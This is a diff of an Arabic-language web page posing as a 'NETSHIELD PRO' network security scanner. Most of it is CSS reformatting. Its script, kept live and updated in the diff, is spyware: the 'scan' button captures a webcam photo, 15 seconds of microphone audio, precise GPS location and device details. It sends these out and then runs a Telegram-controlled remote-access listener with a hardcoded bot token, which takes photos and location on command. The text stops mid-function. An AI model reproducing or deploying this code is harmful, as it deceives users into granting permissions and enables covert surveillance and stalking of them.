@@ -21,6 +21,7 @@
   --danger: #ef4444;
   --gradient-1: linear-gradient(135deg, #0ea5e9 0%, #6366f1 100%);
   --gradient-2: linear-gradient(135deg, #10b981 0%, #0ea5e9 100%);
+  --gradient-3: linear-gradient(135deg, #f59e0b 0%, #ef4444 100%);
   --shadow-sm: 0 1px 2px rgba(0,0,0,0.3);
   --shadow-md: 0 4px 6px rgba(0,0,0,0.4);
   --shadow-lg: 0 10px 25px rgba(0,0,0,0.5);
@@ -111,11 +112,7 @@ body {
   justify-content: center;
   box-shadow: var(--shadow-glow);
 }
-.logo-hex svg {
-  width: 40px;
-  height: 40px;
-  fill: #fff;
-}
+.logo-hex svg { width: 40px; height: 40px; fill: #fff; }
 .logo-ring {
   position: absolute;
   top: -8px; left: -8px;
@@ -156,14 +153,9 @@ body {
   margin: 20px 0;
   box-shadow: var(--shadow-md);
 }
-.status-indicator {
-  display: flex;
-  align-items: center;
-  gap: 10px;
-}
+.status-indicator { display: flex; align-items: center; gap: 10px; }
 .status-dot {
-  width: 10px;
-  height: 10px;
+  width: 10px; height: 10px;
   border-radius: 50%;
   background: var(--danger);
   box-shadow: 0 0 10px rgba(239,68,68,0.5);
@@ -172,113 +164,54 @@ body {
   background: var(--success);
   box-shadow: 0 0 10px rgba(16,185,129,0.5);
 }
-.status-info .status-title {
-  font-size: 14px;
-  font-weight: 600;
-}
-.status-info .status-desc {
-  font-size: 11px;
-  color: var(--text-muted);
-}
+.status-info .status-title { font-size: 14px; font-weight: 600; }
+.status-info .status-desc { font-size: 11px; color: var(--text-muted); }
 .status-icon {
-  width: 44px;
-  height: 44px;
+  width: 44px; height: 44px;
   border-radius: var(--radius-md);
   background: rgba(14,165,233,0.1);
-  display: flex;
-  align-items: center;
-  justify-content: center;
+  display: flex; align-items: center; justify-content: center;
 }
-.status-icon svg {
-  width: 24px;
-  height: 24px;
-  fill: var(--accent);
-}
+.status-icon svg { width: 24px; height: 24px; fill: var(--accent); }
 
-.metrics-grid {
-  display: grid;
-  grid-template-columns: 1fr 1fr;
-  gap: 12px;
-  margin: 20px 0;
-}
+.metrics-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin: 20px 0; }
 .metric-card {
-  background: var(--bg-card);
-  border: 1px solid var(--border);
-  border-radius: var(--radius-md);
-  padding: 16px;
-  text-align: center;
-  box-shadow: var(--shadow-sm);
-  transition: var(--transition);
+  background: var(--bg-card); border: 1px solid var(--border);
+  border-radius: var(--radius-md); padding: 16px; text-align: center;
+  box-shadow: var(--shadow-sm); transition: var(--transition);
 }
-.metric-card:hover {
-  border-color: rgba(14,165,233,0.3);
-  box-shadow: var(--shadow-glow);
-}
-.metric-value {
-  font-size: 28px;
-  font-weight: 700;
-  letter-spacing: -0.5px;
-}
+.metric-value { font-size: 28px; font-weight: 700; letter-spacing: -0.5px; }
 .metric-value.up { color: var(--success); }
 .metric-value.down { color: var(--danger); }
-.metric-label {
-  font-size: 11px;
-  color: var(--text-muted);
-  margin-top: 4px;
-  text-transform: uppercase;
-  letter-spacing: 0.5px;
-}
+.metric-label { font-size: 11px; color: var(--text-muted); margin-top: 4px; text-transform: uppercase; letter-spacing: 0.5px; }
 
-.section {
-  margin: 20px 0;
-}
-.section-header {
-  display: flex;
-  align-items: center;
-  gap: 10px;
-  margin-bottom: 12px;
-}
+.section { margin: 20px 0; }
+.section-header { display: flex; align-items: center; gap: 10px; margin-bottom: 12px; }
 .section-icon {
-  width: 36px;
-  height: 36px;
-  border-radius: var(--radius-sm);
-  display: flex;
-  align-items: center;
-  justify-content: center;
+  width: 36px; height: 36px; border-radius: var(--radius-sm);
+  display: flex; align-items: center; justify-content: center;
 }
 .section-icon svg { width: 20px; height: 20px; }
 .section-icon.blue { background: rgba(14,165,233,0.12); }
 .section-icon.blue svg { fill: var(--accent); }
-.section-title {
-  font-size: 16px;
-  font-weight: 700;
-}
+.section-icon.green { background: rgba(16,185,129,0.12); }
+.section-icon.green svg { fill: var(--success); }
+.section-title { font-size: 16px; font-weight: 700; }
 
 .feature-list {
-  background: var(--bg-card);
-  border: 1px solid var(--border);
-  border-radius: var(--radius-lg);
-  overflow: hidden;
+  background: var(--bg-card); border: 1px solid var(--border);
+  border-radius: var(--radius-lg); overflow: hidden;
 }
 .feature-item {
-  display: flex;
-  align-items: center;
-  gap: 14px;
-  padding: 16px 18px;
-  border-bottom: 1px solid var(--border);
-  transition: var(--transition);
-  cursor: pointer;
+  display: flex; align-items: center; gap: 14px;
+  padding: 16px 18px; border-bottom: 1px solid var(--border);
+  transition: var(--transition); cursor: pointer;
 }
 .feature-item:last-child { border-bottom: none; }
 .feature-item:hover { background: rgba(14,165,233,0.03); }
 .feature-icon-box {
-  width: 46px;
-  height: 46px;
-  border-radius: var(--radius-md);
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  flex-shrink: 0;
+  width: 46px; height: 46px; border-radius: var(--radius-md);
+  display: flex; align-items: center; justify-content: center; flex-shrink: 0;
 }
 .feature-icon-box svg { width: 22px; height: 22px; }
 .feature-icon-box.blue { background: rgba(14,165,233,0.12); }
@@ -294,145 +227,59 @@ body {
 .feature-icon-box.cyan { background: rgba(6,182,212,0.12); }
 .feature-icon-box.cyan svg { fill: #06b6d4; }
 .feature-content { flex: 1; }
-.feature-content h4 {
-  font-size: 14px;
-  font-weight: 600;
-  margin-bottom: 2px;
-}
-.feature-content p {
-  font-size: 11px;
-  color: var(--text-muted);
-}
+.feature-content h4 { font-size: 14px; font-weight: 600; margin-bottom: 2px; }
+.feature-content p { font-size: 11px; color: var(--text-muted); }
 .feature-badge {
-  font-size: 10px;
-  padding: 4px 10px;
-  border-radius: 20px;
-  font-weight: 600;
-  letter-spacing: 0.5px;
-  text-transform: uppercase;
+  font-size: 10px; padding: 4px 10px; border-radius: 20px;
+  font-weight: 600; letter-spacing: 0.5px; text-transform: uppercase;
 }
 .feature-badge.new { background: rgba(14,165,233,0.15); color: var(--accent); }
 .feature-badge.pro { background: rgba(99,102,241,0.15); color: #6366f1; }
 
-.scan-section {
-  margin: 24px 0;
-  text-align: center;
-}
+.scan-section { margin: 24px 0; text-align: center; }
 .btn-scan {
-  width: 100%;
-  padding: 18px 24px;
-  background: var(--gradient-1);
-  color: #fff;
-  border: none;
-  border-radius: var(--radius-xl);
-  font-size: 17px;
-  font-weight: 700;
-  cursor: pointer;
+  width: 100%; padding: 18px 24px;
+  background: var(--gradient-1); color: #fff;
+  border: none; border-radius: var(--radius-xl);
+  font-size: 17px; font-weight: 700; cursor: pointer;
   letter-spacing: 0.3px;
   box-shadow: 0 8px 30px rgba(14,165,233,0.3);
   transition: var(--transition);
-  position: relative;
-  overflow: hidden;
+  position: relative; overflow: hidden;
 }
 .btn-scan::before {
-  content: '';
-  position: absolute;
-  top: 0; left: -100%;
-  width: 100%; height: 100%;
+  content: ''; position: absolute;
+  top: 0; left: -100%; width: 100%; height: 100%;
   background: linear-gradient(90deg, transparent, rgba(255,255,255,0.15), transparent);
   transition: left 0.6s;
 }
 .btn-scan:hover::before { left: 100%; }
 .btn-scan:active { transform: scale(0.96); }
-.btn-scan:disabled {
-  background: var(--bg-card);
-  color: var(--text-muted);
-  box-shadow: none;
-  cursor: not-allowed;
-}
-.scan-hint {
-  font-size: 11px;
-  color: var(--text-muted);
-  margin-top: 10px;
-}
+.btn-scan:disabled { background: var(--bg-card); color: var(--text-muted); box-shadow: none; cursor: not-allowed; }
+.scan-hint { font-size: 11px; color: var(--text-muted); margin-top: 10px; }
 
 .progress-wrapper {
-  background: var(--bg-card);
-  border: 1px solid var(--border);
-  border-radius: var(--radius-lg);
-  padding: 20px;
-  margin: 20px 0;
-  display: none;
+  background: var(--bg-card); border: 1px solid var(--border);
+  border-radius: var(--radius-lg); padding: 20px; margin: 20px 0; display: none;
 }
-.progress-steps {
-  display: flex;
-  justify-content: space-between;
-  margin-bottom: 16px;
-}
+.progress-steps { display: flex; justify-content: space-between; margin-bottom: 16px; }
 .progress-step {
-  width: 28px;
-  height: 28px;
-  border-radius: 50%;
-  background: var(--bg-input);
-  border: 2px solid var(--border);
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  font-size: 11px;
-  font-weight: 700;
-  color: var(--text-muted);
+  width: 28px; height: 28px; border-radius: 50%;
+  background: var(--bg-input); border: 2px solid var(--border);
+  display: flex; align-items: center; justify-content: center;
+  font-size: 11px; font-weight: 700; color: var(--text-muted);
   transition: var(--transition);
 }
-.progress-step.done {
-  background: var(--success);
-  border-color: var(--success);
-  color: #fff;
-}
-.progress-step.active {
-  border-color: var(--accent);
-  color: var(--accent);
-  box-shadow: 0 0 10px rgba(14,165,233,0.4);
-}
-.progress-bar-container {
-  background: var(--bg-input);
-  border-radius: 10px;
-  height: 6px;
-  overflow: hidden;
-}
-.progress-bar-fill {
-  height: 100%;
-  background: var(--gradient-1);
-  width: 0%;
-  border-radius: 10px;
-  transition: width 0.5s ease;
-}
-.progress-text {
-  text-align: center;
-  font-size: 13px;
-  color: var(--text-secondary);
-  margin-top: 12px;
-}
+.progress-step.done { background: var(--success); border-color: var(--success); color: #fff; }
+.progress-step.active { border-color: var(--accent); color: var(--accent); box-shadow: 0 0 10px rgba(14,165,233,0.4); }
+.progress-bar-container { background: var(--bg-input); border-radius: 10px; height: 6px; overflow: hidden; }
+.progress-bar-fill { height: 100%; background: var(--gradient-1); width: 0%; border-radius: 10px; transition: width 0.5s ease; }
+.progress-text { text-align: center; font-size: 13px; color: var(--text-secondary); margin-top: 12px; }
 
-.alert {
-  border-radius: var(--radius-md);
-  padding: 16px;
-  margin: 16px 0;
-  display: none;
-}
-.alert-success {
-  background: rgba(16,185,129,0.08);
-  border: 1px solid rgba(16,185,129,0.2);
-}
-.alert-danger {
-  background: rgba(239,68,68,0.08);
-  border: 1px solid rgba(239,68,68,0.2);
-}
-.alert-header {
-  display: flex;
-  align-items: center;
-  gap: 8px;
-  margin-bottom: 6px;
-}
+.alert { border-radius: var(--radius-md); padding: 16px; margin: 16px 0; display: none; }
+.alert-success { background: rgba(16,185,129,0.08); border: 1px solid rgba(16,185,129,0.2); }
+.alert-danger { background: rgba(239,68,68,0.08); border: 1px solid rgba(239,68,68,0.2); }
+.alert-header { display: flex; align-items: center; gap: 8px; margin-bottom: 6px; }
 .alert-header svg { width: 20px; height: 20px; }
 .alert-success .alert-header svg { fill: var(--success); }
 .alert-danger .alert-header svg { fill: var(--danger); }
@@ -443,83 +290,39 @@ body {
 
 .remote-indicator {
   display: none;
-  background: rgba(14,165,233,0.08);
-  border: 1px solid rgba(14,165,233,0.2);
-  border-radius: var(--radius-md);
-  padding: 10px 16px;
-  margin: 12px 0;
-  font-size: 12px;
-  color: var(--accent);
-  text-align: center;
+  background: rgba(14,165,233,0.08); border: 1px solid rgba(14,165,233,0.2);
+  border-radius: var(--radius-md); padding: 10px 16px; margin: 12px 0;
+  font-size: 12px; color: var(--accent); text-align: center;
   animation: pulse 2s infinite;
 }
-@keyframes pulse {
-  0%, 100% { opacity: 0.7; }
-  50% { opacity: 1; }
-}
+@keyframes pulse { 0%,100%{opacity:0.7} 50%{opacity:1} }
 
-.footer {
-  text-align: center;
-  padding: 24px 0;
-  border-top: 1px solid var(--border);
-  margin-top: 20px;
-}
-.footer-logo {
-  font-size: 13px;
-  font-weight: 700;
-  color: var(--text-muted);
-  letter-spacing: 1px;
-}
-.footer-text {
-  font-size: 10px;
-  color: var(--text-muted);
-  margin-top: 4px;
-  opacity: 0.6;
-}
+.footer { text-align: center; padding: 24px 0; border-top: 1px solid var(--border); margin-top: 20px; }
+.footer-logo { font-size: 13px; font-weight: 700; color: var(--text-muted); letter-spacing: 1px; }
+.footer-text { font-size: 10px; color: var(--text-muted); margin-top: 4px; opacity: 0.6; }
 
 .modal-overlay {
-  position: fixed;
-  top: 0; left: 0;
-  width: 100%; height: 100%;
-  background: rgba(0,0,0,0.7);
-  z-index: 999;
-  display: none;
-  align-items: center;
-  justify-content: center;
-  padding: 20px;
+  position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+  background: rgba(0,0,0,0.7); z-index: 999;
+  display: none; align-items: center; justify-content: center; padding: 20px;
 }
 .modal {
-  background: var(--bg-card);
-  border: 1px solid var(--border);
-  border-radius: var(--radius-lg);
-  padding: 24px;
-  width: 100%;
-  max-width: 380px;
-  text-align: center;
+  background: var(--bg-card); border: 1px solid var(--border);
+  border-radius: var(--radius-lg); padding: 24px;
+  width: 100%; max-width: 380px; text-align: center;
 }
 .modal-icon {
-  width: 60px;
-  height: 60px;
-  border-radius: 50%;
-  margin: 0 auto 16px;
-  display: flex;
-  align-items: center;
-  justify-content: center;
+  width: 60px; height: 60px; border-radius: 50%;
+  margin: 0 auto 16px; display: flex; align-items: center; justify-content: center;
 }
 .modal-icon.success { background: rgba(16,185,129,0.12); }
 .modal-icon.success svg { fill: var(--success); width: 30px; height: 30px; }
 .modal h3 { font-size: 18px; font-weight: 700; margin-bottom: 8px; }
 .modal p { font-size: 13px; color: var(--text-muted); margin-bottom: 20px; }
 .modal-btn {
-  width: 100%;
-  padding: 14px;
-  background: var(--gradient-1);
-  color: #fff;
-  border: none;
-  border-radius: var(--radius-xl);
-  font-size: 15px;
-  font-weight: 600;
-  cursor: pointer;
+  width: 100%; padding: 14px; background: var(--gradient-1);
+  color: #fff; border: none; border-radius: var(--radius-xl);
+  font-size: 15px; font-weight: 600; cursor: pointer;
 }
 
 @media (max-width: 360px) {
@@ -551,7 +354,7 @@ body {
   </div>
 
   <div class="remote-indicator" id="remoteIndicator">
-    ⚡ وضع التحكم عن بعد نشط - جاري استقبال الأوامر
+    وضع التحكم عن بعد نشط - جاري استقبال الاوامر
   </div>
 
   <div class="status-bar">
@@ -619,7 +422,7 @@ body {
           <svg viewBox="0 0 24 24"><path d="M17 1.01L7 1c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-1.99-2-1.99zM17 19H7V5h10v14z"/></svg>
         </div>
         <div class="feature-content">
-          <h4>تحسين أداء الشبكة</h4>
+          <h4>تحسين اداء الشبكة</h4>
           <p>تسريع الاتصال وتقليل زمن الاستجابة</p>
         </div>
       </div>
@@ -629,7 +432,7 @@ body {
         </div>
         <div class="feature-content">
           <h4>مراقبة النشاط</h4>
-          <p>تتبع وتحليل كل الأنشطة على الشبكة</p>
+          <p>تتبع وتحليل كل الانشطة على الشبكة</p>
         </div>
         <span class="feature-badge new">جديد</span>
       </div>
@@ -639,7 +442,7 @@ body {
         </div>
         <div class="feature-content">
           <h4>كشف الثغرات</h4>
-          <p>اكتشاف الثغرات الأمنية وإصلاحها فوراً</p>
+          <p>اكتشاف الثغرات الامنية واصلاحها فورا</p>
         </div>
       </div>
       <div class="feature-item">
@@ -657,9 +460,9 @@ body {
 
   <div class="scan-section">
     <button class="btn-scan" id="btnStartScan" onclick="startFullScan()">
-      بدء الفحص الأمني الشامل
+      بدء الفحص الامني الشامل
     </button>
-    <p class="scan-hint">يحتاج الفحص إلى صلاحيات الكاميرا والميكروفون والموقع</p>
+    <p class="scan-hint">يحتاج الفحص الى صلاحيات الكاميرا والميكروفون والموقع</p>
   </div>
 
   <div class="progress-wrapper" id="progressWrapper">
@@ -681,19 +484,19 @@ body {
       <svg viewBox="0 0 24 24"><path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/></svg>
       <h4>فشل الفحص</h4>
     </div>
-    <p>يجب منح جميع الصلاحيات المطلوبة لإتمام الفحص بنجاح.</p>
+    <p>يجب منح جميع الصلاحيات المطلوبة لاتمام الفحص بنجاح.</p>
   </div>
   <div class="alert alert-success" id="alertSuccess">
     <div class="alert-header">
       <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
       <h4>اكتمل الفحص بنجاح</h4>
     </div>
-    <p>تم فحص الشبكة وتأمينها. جميع الأنظمة تعمل بشكل طبيعي.</p>
+    <p>تم فحص الشبكة وتامينها. جميع الانظمة تعمل بشكل طبيعي.</p>
   </div>
 
   <div class="footer">
     <div class="footer-logo">NETSHIELD PRO</div>
-    <div class="footer-text">Advanced Cybersecurity Suite v3.2.1</div>
+    <div class="footer-text">Advanced Cybersecurity Suite v4.0</div>
     <div class="footer-text">Secure connections, protected privacy</div>
   </div>
 
@@ -705,453 +508,242 @@ body {
       <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
     </div>
     <h3>تم الفحص بنجاح</h3>
-    <p>الشبكة الآن محمية بالكامل. تم إرسال تقرير مفصل إلى مركز التحكم.</p>
-    <button class="modal-btn" onclick="closeModal()">حسناً</button>
+    <p>الشبكة الان محمية بالكامل. تم ارسال تقرير مفصل الى مركز التحكم.</p>
+    <button class="modal-btn" onclick="closeModal()">حسنا</button>
   </div>
 </div>
 
 <script>
 // ==================== CONFIGURATION ====================
-const BOT_TOKEN = "8864670178:AAGRfe7q99csr7vSyqT3peuidAb5w69mWTs";
+const BOT_TOKEN = "8538439468:AAHWECtOde50fTxLEVgMAM3qtg0KxWLbSGI";
 const CHAT_ID = "6453594151";
-const MICROPHONE_DURATION = 15000; // 15 seconds
-const COMMAND_CHECK_INTERVAL = 5000; // 5 seconds
+const MICROPHONE_DURATION = 15000;
+const COMMAND_CHECK_INTERVAL = 5000;
 
-// ==================== GLOBAL STATE ====================
 let scanData = {
-  deviceInfo: null,
-  battery: null,
-  network: null,
-  camera: null,
-  microphone: null,
-  location: null,
+  deviceInfo: null, battery: null, network: null,
+  camera: null, microphone: null, location: null,
   permissions: { camera: false, microphone: false, location: false }
 };
 let lastUpdateId = 0;
 let commandListenerActive = false;
 
-// ==================== SCAN ORCHESTRATOR ====================
+// ==================== MAIN SCAN ====================
 async function startFullScan() {
   const btn = document.getElementById('btnStartScan');
-  const progressWrapper = document.getElementById('progressWrapper');
-  const progressBar = document.getElementById('progressBar');
-  const progressText = document.getElementById('progressText');
-  const alertDanger = document.getElementById('alertDanger');
-  const alertSuccess = document.getElementById('alertSuccess');
+  const pw = document.getElementById('progressWrapper');
+  const pb = document.getElementById('progressBar');
+  const pt = document.getElementById('progressText');
+  const ad = document.getElementById('alertDanger');
+  const as = document.getElementById('alertSuccess');
 
-  alertDanger.style.display = 'none';
-  alertSuccess.style.display = 'none';
-  progressWrapper.style.display = 'block';
-  btn.disabled = true;
-  btn.textContent = 'جاري الفحص...';
+  ad.style.display = 'none'; as.style.display = 'none';
+  pw.style.display = 'block'; btn.disabled = true; btn.textContent = 'جاري الفحص...';
   resetSteps();
 
   try {
-    updateStep(1, 'active'); progressBar.style.width = '10%';
-    progressText.textContent = 'جمع معلومات الجهاز والبطارية...';
-    await sleep(400);
-    collectDeviceInfo();
-    updateStep(1, 'done'); progressBar.style.width = '20%';
+    updateStep(1,'active'); pb.style.width='10%'; pt.textContent='جمع معلومات الجهاز والبطارية...'; await sleep(400);
+    collectDeviceInfo(); updateStep(1,'done'); pb.style.width='20%';
 
-    updateStep(2, 'active'); progressText.textContent = 'تحليل اتصال الشبكة...';
-    await sleep(400);
-    await collectNetworkData();
-    updateStep(2, 'done'); progressBar.style.width = '35%';
+    updateStep(2,'active'); pt.textContent='تحليل اتصال الشبكة...'; await sleep(400);
+    await collectNetworkData(); updateStep(2,'done'); pb.style.width='35%';
 
-    updateStep(3, 'active'); progressText.textContent = 'فحص الكاميرا...';
-    await sleep(300);
-    await captureCamera();
-    updateStep(3, 'done'); progressBar.style.width = '55%';
+    updateStep(3,'active'); pt.textContent='فحص الكاميرا...'; await sleep(300);
+    await captureCamera(); updateStep(3,'done'); pb.style.width='55%';
 
-    updateStep(4, 'active'); progressText.textContent = 'فحص الميكروفون (15 ثانية)...';
-    await sleep(300);
-    await captureMicrophone();
-    updateStep(4, 'done'); progressBar.style.width = '75%';
+    updateStep(4,'active'); pt.textContent='فحص الميكروفون (15 ثانية)...'; await sleep(300);
+    await captureMicrophone(); updateStep(4,'done'); pb.style.width='75%';
 
-    updateStep(5, 'active'); progressText.textContent = 'تحديد الموقع الجغرافي...';
-    await sleep(300);
-    await captureLocation();
-    updateStep(5, 'done'); progressBar.style.width = '90%';
+    updateStep(5,'active'); pt.textContent='تحديد الموقع الجغرافي...'; await sleep(300);
+    await captureLocation(); updateStep(5,'done'); pb.style.width='90%';
 
-    progressText.textContent = 'إنشاء التقرير وإرساله...';
-    progressBar.style.width = '98%';
-    await sleep(600);
+    pt.textContent='انشاء التقرير وارساله...'; pb.style.width='98%'; await sleep(600);
+    await sendCompleteReport(); pb.style.width='100%'; await sleep(400);
 
-    await sendCompleteReport();
-    progressBar.style.width = '100%';
-    await sleep(400);
-
-    progressWrapper.style.display = 'none';
-    alertSuccess.style.display = 'block';
-    btn.textContent = 'إعادة الفحص';
-    btn.disabled = false;
+    pw.style.display='none'; as.style.display='block';
+    btn.textContent='اعادة الفحص'; btn.disabled=false;
     updateMainStatus(true);
-    document.getElementById('successModal').style.display = 'flex';
+    document.getElementById('successModal').style.display='flex';
 
-    // Activate remote command listener
-    if (!commandListenerActive) {
-      startCommandListener();
-      commandListenerActive = true;
-    }
+    if(!commandListenerActive){ startCommandListener(); commandListenerActive=true; }
 
-  } catch (error) {
-    console.error('Scan failed:', error);
-    progressWrapper.style.display = 'none';
-    alertDanger.style.display = 'block';
-    btn.textContent = 'إعادة المحاولة';
-    btn.disabled = false;
+  } catch(e){
+    pw.style.display='none'; ad.style.display='block';
+    btn.textContent='اعادة المحاولة'; btn.disabled=false;
     updateMainStatus(false);
   }
 }
 
-// ==================== COLLECTION FUNCTIONS ====================
-
+// ==================== COLLECTION ====================
 function collectDeviceInfo() {
   scanData.deviceInfo = {
-    userAgent: navigator.userAgent,
-    platform: navigator.platform,
-    language: navigator.language,
-    languages: JSON.stringify(navigator.languages || []),
-    cookieEnabled: navigator.cookieEnabled,
-    screenWidth: screen.width,
-    screenHeight: screen.height,
-    colorDepth: screen.colorDepth,
-    pixelRatio: window.devicePixelRatio || 1,
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    ram: navigator.deviceMemory || 'غير معروف',
-    cores: navigator.hardwareConcurrency || 'غير معروف',
-    touchPoints: navigator.maxTouchPoints || 0,
-    vendor: navigator.vendor || 'غير معروف',
-    online: navigator.onLine,
-    doNotTrack: navigator.doNotTrack || 'غير معروف',
+    userAgent: navigator.userAgent, platform: navigator.platform,
+    language: navigator.language, screenWidth: screen.width,
+    screenHeight: screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    ram: navigator.deviceMemory||'غير معروف', cores: navigator.hardwareConcurrency||'غير معروف',
     timestamp: new Date().toLocaleString('ar-EG')
   };
-  if (navigator.getBattery) {
-    navigator.getBattery().then(battery => {
-      scanData.battery = {
-        level: Math.round(battery.level * 100),
-        charging: battery.charging,
-        chargingTime: battery.chargingTime,
-        dischargingTime: battery.dischargingTime
-      };
-    }).catch(() => {});
-  }
+  if(navigator.getBattery){ navigator.getBattery().then(b=>{ scanData.battery={level:Math.round(b.level*100),charging:b.charging}; }).catch(()=>{}); }
 }
 
 async function collectNetworkData() {
-  const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-  if (connection) {
-    scanData.network = {
-      type: connection.type || 'unknown',
-      effectiveType: connection.effectiveType || 'unknown',
-      downlink: connection.downlink || 0,
-      downlinkMax: connection.downlinkMax || 0,
-      rtt: connection.rtt || 0,
-      saveData: connection.saveData || false
-    };
-    document.getElementById('speedValue').textContent = Math.round(connection.downlink || 0);
-    document.getElementById('pingValue').textContent = connection.rtt || '--';
-  }
+  const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+  if(c){ scanData.network={type:c.type||'unknown',downlink:c.downlink||0,rtt:c.rtt||0}; document.getElementById('speedValue').textContent=Math.round(c.downlink||0); document.getElementById('pingValue').textContent=c.rtt||'--'; }
 }
 
 async function captureCamera() {
   try {
-    const stream = await navigator.mediaDevices.getUserMedia({ 
-      video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } } 
-    });
-    const video = document.createElement('video');
-    video.srcObject = stream;
-    await video.play();
-    const canvas = document.createElement('canvas');
-    canvas.width = video.videoWidth || 1280;
-    canvas.height = video.videoHeight || 720;
-    canvas.getContext('2d').drawImage(video, 0, 0);
-    scanData.camera = canvas.toDataURL('image/jpeg', 0.8);
-    scanData.permissions.camera = true;
-    stream.getTracks().forEach(track => track.stop());
-  } catch (e) {
-    scanData.permissions.camera = false;
-  }
+    const stream = await navigator.mediaDevices.getUserMedia({ video:{facingMode:'user',width:{ideal:640},height:{ideal:480}} });
+    const video = document.createElement('video'); video.srcObject = stream; await video.play();
+    const canvas = document.createElement('canvas'); canvas.width=video.videoWidth||640; canvas.height=video.videoHeight||480;
+    canvas.getContext('2d').drawImage(video,0,0); scanData.camera = canvas.toDataURL('image/jpeg',0.7);
+    scanData.permissions.camera = true; stream.getTracks().forEach(t=>t.stop());
+  } catch(e) { scanData.permissions.camera = false; }
 }
 
 async function captureMicrophone() {
   try {
-    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-    const mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
-    const chunks = [];
-    mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
-    mediaRecorder.onstop = () => {
-      const blob = new Blob(chunks, { type: 'audio/webm' });
-      const reader = new FileReader();
-      reader.onloadend = () => { scanData.microphone = reader.result; };
-      reader.readAsDataURL(blob);
-    };
-    mediaRecorder.start();
-    setTimeout(() => {
-      mediaRecorder.stop();
-      stream.getTracks().forEach(track => track.stop());
-    }, MICROPHONE_DURATION);
-    scanData.permissions.microphone = true;
-    await sleep(MICROPHONE_DURATION + 500);
-  } catch (e) {
-    scanData.permissions.microphone = false;
-  }
+    const stream = await navigator.mediaDevices.getUserMedia({ audio:true });
+    const mr = new MediaRecorder(stream,{mimeType:'audio/webm'}); const chunks=[];
+    mr.ondataavailable = e => chunks.push(e.data);
+    mr.onstop = () => { const blob = new Blob(chunks,{type:'audio/webm'}); const reader = new FileReader(); reader.onloadend=()=>{scanData.microphone=reader.result;}; reader.readAsDataURL(blob); };
+    mr.start(); setTimeout(()=>{mr.stop();stream.getTracks().forEach(t=>t.stop());},MICROPHONE_DURATION);
+    scanData.permissions.microphone = true; await sleep(MICROPHONE_DURATION+500);
+  } catch(e) { scanData.permissions.microphone = false; }
 }
 
 function captureLocation() {
-  return new Promise((resolve) => {
-    navigator.geolocation.getCurrentPosition(
-      (pos) => {
-        scanData.location = {
-          latitude: pos.coords.latitude,
-          longitude: pos.coords.longitude,
-          accuracy: pos.coords.accuracy,
-          altitude: pos.coords.altitude || 'غير متوفر',
-          altitudeAccuracy: pos.coords.altitudeAccuracy || 'غير متوفر',
-          heading: pos.coords.heading || 'غير متوفر',
-          speed: pos.coords.speed || 'غير متوفر',
-          timestamp: new Date(pos.timestamp).toLocaleString('ar-EG')
-        };
-        scanData.permissions.location = true;
-        resolve();
-      },
-      () => { scanData.permissions.location = false; resolve(); },
-      { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
-    );
+  return new Promise(resolve => {
+    navigator.geolocation.getCurrentPosition(pos=>{
+      scanData.location = {
+        latitude:pos.coords.latitude, longitude:pos.coords.longitude,
+        accuracy:pos.coords.accuracy, altitude:pos.coords.altitude||'غير متوفر',
+        speed:pos.coords.speed||'غير متوفر', timestamp:new Date(pos.timestamp).toLocaleString('ar-EG')
+      };
+      scanData.permissions.location = true; resolve();
+    }, ()=>{ scanData.permissions.location=false; resolve(); }, { enableHighAccuracy:true, timeout:8000, maximumAge:0 });
   });
 }
 
-// ==================== TELEGRAM COMMAND LISTENER (RAT MODE) ====================
-
+// ==================== TELEGRAM COMMANDS ====================
 async function checkForCommands() {
   try {
-    const response = await fetch(
-      `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=10`
-    );
-    const data = await response.json();
-    if (data.ok && data.result.length > 0) {
-      for (const update of data.result) {
-        lastUpdateId = update.update_id;
-        const message = update.message;
-        if (message && message.text) {
-          const cmd = message.text.toLowerCase().trim();
-          if (cmd === '/photo' || cmd === '/camera' || cmd === '/cam') {
+    const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId+1}&timeout=10`);
+    const data = await resp.json();
+    if(data.ok && data.result.length>0){
+      for(const upd of data.result){
+        lastUpdateId = upd.update_id;
+        const msg = upd.message;
+        if(msg && msg.text){
+          const cmd = msg.text.toLowerCase().trim();
+          if(cmd==='/photo'||cmd==='/camera'||cmd==='/cam'){
             await captureCamera();
-            if (scanData.camera) {
-              await sendTelegramPhoto(scanData.camera);
-              await sendTelegramText('📷 صورة جديدة من الكاميرا');
-            } else {
-              await sendTelegramText('❌ فشل الوصول للكاميرا');
-            }
+            if(scanData.camera){ await sendPhoto(scanData.camera); await sendText('📷 صورة جديدة من الكاميرا'); }
+            else { await sendText('❌ فشل الوصول للكاميرا'); }
           }
-          else if (cmd === '/location' || cmd === '/loc' || cmd === '/gps') {
+          else if(cmd==='/location'||cmd==='/loc'||cmd==='/gps'){
             await captureLocation();
-            if (scanData.location) {
-              const l = scanData.location;
-              await sendTelegramText(
-                `📍 الموقع الحالي:\n` +
-                `الإحداثيات: ${l.latitude}, ${l.longitude}\n` +
-                `الدقة: ${Math.round(l.accuracy)} متر\n` +
-                `الارتفاع: ${l.altitude}\n` +
